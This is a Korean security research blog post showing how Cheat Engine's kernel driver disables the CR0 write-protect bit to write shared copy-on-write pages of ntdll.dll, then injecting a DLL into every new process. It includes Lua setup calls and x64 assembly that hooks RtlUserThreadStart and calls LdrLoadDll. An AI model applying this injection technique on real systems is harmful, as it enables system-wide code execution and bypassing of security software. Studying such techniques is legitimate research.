---
layout: post
title:  "Copy-On-Write 페이지 조작을 이용한 Global Dll injection"
author: "badspell"
comments: true
tags: [windows, system, research]
---

라온화이트햇 핵심연구팀 김재성

# 1. 개요

---

최근에 Windows 프로세스 메모리를 보호하는 기법을 찾아보다가 흥미로운 글을 본적이 있었습니다.

undocumented인 `SEC_NO_CHANGE` 옵션으로 섹션을 생성하고 메모리를 Mapping 하면 이후 페이지 속성이 변경되는 것을 유저레벨에서도 보호할 수 있다는건데, 이미 일부 보안 프로그램에서도 사용 중인 기법이었습니다.

실제로 자기자신의 메모리를 `SEC_NO_CHANGE` 옵션으로 Remapping해주는 예제([https://github.com/changeofpace/Self-Remapping-Code](https://github.com/changeofpace/Self-Remapping-Code))를 테스트해보면 VirtualProtect 함수가 실패하고 내부적으로 페이지 보호속성을 변경하는 WriteProessMemory 함수 역시 작동하지 않습니다.

보호된 메모리를 Unmap, Free하고 새로 할당하는 방법 이외에는 우회할 방법이 없어보였는데 Cheat Engine의 특정 기능을 활성화해서 우회 가능한것을 확인했고 조금 더 응용하여 Copy-On-Write 페이지 조작을 통한 Global Dll injection까지 가능해보여 이를 시도해보았습니다.

# 2. 메모리 보호 우회와 Copy-On-Write

---

![/assets/bad60.png](/assets/bad60.png)

Cheat Engine의 `Query memory region routine`, `Read/Write Process Memory` 위 두 옵션을 활성화하면 커널 드라이버를 이용한 메모리 읽기/쓰기를 지원하는데, 해당 옵션들은 보호된 읽기전용 페이지에는 여전히 쓰기가 불가능합니다.  페이지 보호 속성을 무시하고 쓰기 작업을 진행하기 위해서는 아래 작업을 추가로 진행해야합니다.

```lua
dbk_initialize();
dbk_useKernelmodeOpenProcess();
dbk_useKernelmodeProcessMemoryAccess();
dbk_writesIgnoreWriteProtection(true);
```

Memory Viewer에서 Ctrl+L을 누르면 Lua script를 실행할 수 있는데 위 스크립트를 실행하면 이후에는 보호된 메모리를 강제로 쓸 수 있게 됩니다.

```c
BOOLEAN WriteProcessMemory(DWORD PID, PEPROCESS PEProcess, PVOID Address, DWORD Size, PVOID Buffer)
{
	...
		KeAttachProcess((PEPROCESS)selectedprocess);
		__try
		{
			char* target;
			char* source;
			unsigned int i;

			if ((IsAddressSafe((UINT_PTR)Address)) && (IsAddressSafe((UINT_PTR)Address + Size - 1)))
			{
				BOOL disabledWP = FALSE;

				target = Address;
				source = Buffer;

				if ((loadedbydbvm) || (KernelWritesIgnoreWP))
				{
					disableInterrupts();

					if (loadedbydbvm)
						vmx_disable_dataPageFaults();

					if (KernelWritesIgnoreWP)
					{
						DbgPrint("Disabling CR0.WP");
						setCR0(getCR0() & (~(1 << 16))); //disable the WP bit					
						disabledWP = TRUE;
					}
				}

				if ((loadedbydbvm) || ((UINT_PTR)target < 0x8000000000000000ULL))
				{
					RtlCopyMemory(target, source, Size);
					ntStatus = STATUS_SUCCESS;
				}
				else
				{
					i = NoExceptions_CopyMemory(target, source, Size);
					if (i != (int)Size)
						ntStatus = STATUS_UNSUCCESSFUL;
					else
						ntStatus = STATUS_SUCCESS;
				}
    ...
}
```

이것이 가능한 이유는 dbk_writesIgnoreWriteProtection 함수에 의해 KernelWritesIgnoreWP 비트가 활성화될 때 Cheat Engine의 커널 함수 WriteProcessMemory에서 CR0 레지스터 WP(Write-Protect) bit를 비활성하고 메모리를 쓰도록 구현되어있기 때문입니다.

여기서 흥미로운 점은 모든 윈도우즈 프로세스에 매핑되는 KUSER_SHARED_DATA (0x7FFE000) 영역 및 Copy-On-Write의 원본 페이지도 조작이 된다는 점입니다.

![/assets/bad61.png](/assets/bad61.png)


![/assets/bad62.png](/assets/bad62.png)

모든 프로세스에는 ntdll.dll을 포함한 몇몇 시스템 라이브러리가 같은 주소공간에 로드되고 일부 Read-Only 페이지는 메모리 공간을 효율적으로 사용하기 위해 Copy-On-Write 기술로 같은 Physical Memory를 가리키고있습니다.

그림의 예시로 ntdll.dll의 0x7FFCEE14401A 주소가 실제 Physical Memory에서는 0x1C25101A에 매핑되어있고 다른 프로세스도 역시 동일한 0x1C25101A 값을 가리킵니다.

![/assets/bad63.png](/assets/bad63.png)

![/assets/bad64.png](/assets/bad64.png)

만약 위 그림의 Process 1에서 Copy-On-Write가 적용된 페이지를 조작하기위해 페이지 속성을 변경하면 그 순간 복제된 Page D(0xCAF9D01A)가 생성되어 그곳을 쓰게되고 Process 2에는 영향을 미치지않게 됩니다.

# 3. Global Dll Injection

---

![/assets/bad65.png](/assets/bad65.png)

![/assets/bad66.png](/assets/bad66.png)

dbk_writesIgnoreWriteProtection 옵션이 활성화된 이후에는 Copy-On-Write 메모리 복제 과정이 일어나지않고 원본 메모리(0x3F050207)에 쓰기가 발생하므로 모든 프로세스 및 앞으로 생성될 프로세스에 코드 실행을 유도할 수 있습니다. 본문에서는 이를 활용하여 Global Dll Injection을 구현해보았습니다.

**[구현 아이디어]**

1. 64비트 기준으로 프로세스가 생성되면 ntdll.RtlUserThreadStart 함수가 실행됩니다.
2. Execute가 가능하고 Copy-On-Write가 적용된 Code cave 영역(ntdll.PssNtWalkSnapshot+5600)을 찾아 해당 영역으로 jmp하는 opcode를 삽입합니다.
3. ntdll.PssNtWalkSnapshot+5600에서 ntdll.NtProtectVirtualMemory 함수를 호출하여 ntdll.RtlUserThreadStart 영역을 PAGE_EXECUTE_READWRITE로 변경하고 원래 opcode로 변경합니다.
4. ntdll.LdrLoadDll 함수를 호출하여 Custom dll을 로드합니다.

3번은 선택사항이므로 본문에서는 1, 2, 4번을 순서대로 구현하였습니다.

```
ntdll.PssNtWalkSnapshot+5600:
inc [ntdll.dll+16A4B8]
sub rsp,78
mov r9,rcx
jmp ntdll.RtlUserThreadStart+7

ntdll.RtlUserThreadStart:
jmp ntdll.PssNtWalkSnapshot+5600
nop
nop
```

먼저 1, 2번까지 정상작동하는 것을 테스트하기 위해 Cheat Engine의 Auto Assemble로 ntdll.RtlUserThreadStart 함수가 호출될 때 [ntdll.dll+16A4B8] 값의 메모리를 1 증가시키는 스크립트를 작성하였습니다.

[ntdll.dll+16A4B8]은 Writeable한 dummy 메모리로 0으로 세팅되어있으며 의도대로라면 새롭게 생성된 프로세스의 [ntdll.dll+16A4B8] 값은 1 이상이어야합니다.

![/assets/bad67.png](/assets/bad67.png)

MessageBox로 Hello, World를 출력하는 것 이외에 아무것도 하지않는 간단한 프로그램을 실행하였을 때 값이 4인걸 확인하여 의도대로 작동하는 것을 볼 수 있습니다.

이제 4번 과정 ntdll.LdrLoadDll 함수를 호출하는 코드를 추가하여 ws2_32.dll가 자동으로 인젝션되도록 하였습니다.

```
NTSTATUS **LdrLoadDll(**
  IN PWCHAR               PathToFile OPTIONAL,
  IN ULONG                Flags OPTIONAL,
  IN PUNICODE_STRING      ModuleFileName,
  OUT PHANDLE             ModuleHandle
);
```

LdrLoadDll 함수 원형은 위와 같은데, 1, 2번째 인자는 NULL로 세팅하고 3번째 인자에 PUNICODE_STRING을 구조체 형식에 맞추어 넣어 호출하면 정상적으로 함수가 호출되었을 때  ModuleHandle값이 담기고 0을 반환합니다.

```
ntdll.PssNtWalkSnapshot+5900:
db 'w', 0, 's', 0, '2', 0, '_', 0, '3', 0, '2', 0, 0, 0 //ws2_32.dll

ntdll.PssNtWalkSnapshot+5700:
dw #12 //length
dw #14 //maxlength
dd 0 //pack
dq ntdll.PssNtWalkSnapshot+5900

ntdll.PssNtWalkSnapshot+5600:
sub rsp, 1000
push r15
push r14
push r13
push r12
push r11
push r10
push r9
push r8
push rsi
push rdi
push rbp
push rdx
push rcx
push rbx
push rax
mov r9, ntdll.dll+16A4B8
mov r8, ntdll.PssNtWalkSnapshot+5700
xor rdx, rdx
xor rcx, rcx
call ntdll.LdrLoadDll
pop rax
pop rbx
pop rcx
pop rdx
pop rbp
pop rdi
pop rsi
pop r8
pop r9
pop r10
pop r11
pop r12
pop r13
pop r14
pop r15
add rsp, 1000

sub rsp,78
mov r9,rcx
jmp ntdll.RtlUserThreadStart+7

ntdll.RtlUserThreadStart:
jmp ntdll.PssNtWalkSnapshot+5600
nop
nop
```

위 스크립트는 4번까지의 과정을 구현한 코드입니다.

주의해야할 점은, LdrLoadDll 함수를 호출하면서 스택 내용이나 레지스터가 변경될때 의도하지 않은 크래시를 유발할 수 있으므로 후킹으로 인한 영향을 최소화하기위해 레지스터들을 백업해야합니다.

![/assets/bad68.png](/assets/bad68.png)

스크립트 실행 이후에 생성되는 모든 프로세스에 ws2_32.dll이 정상적으로 injection되는 것을 확인할 수 있습니다.

32비트 프로세스에도 64비트 ntdll.dll 라이브러리가 로드는 되지만 64비트의 ntdll.RtlUserThreadStart 함수가 실행되지않으므로 32비트 프로세스까지 Global injection을 하려면 Inject할 32비트 dll이 필요하고 32비트 ntdll.dll의 Copy-On-Write 영역을 추가로 패치해야합니다.

# 4. Reference

---

1. [https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection](https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection)
2. [https://github.com/cheat-engine/cheat-engine](https://github.com/cheat-engine/cheat-engine)
3. [https://github.com/changeofpace/Self-Remapping-Code](https://github.com/changeofpace/Self-Remapping-Code)
4. [https://en.wikipedia.org/wiki/Control_register](https://en.wikipedia.org/wiki/Control_register)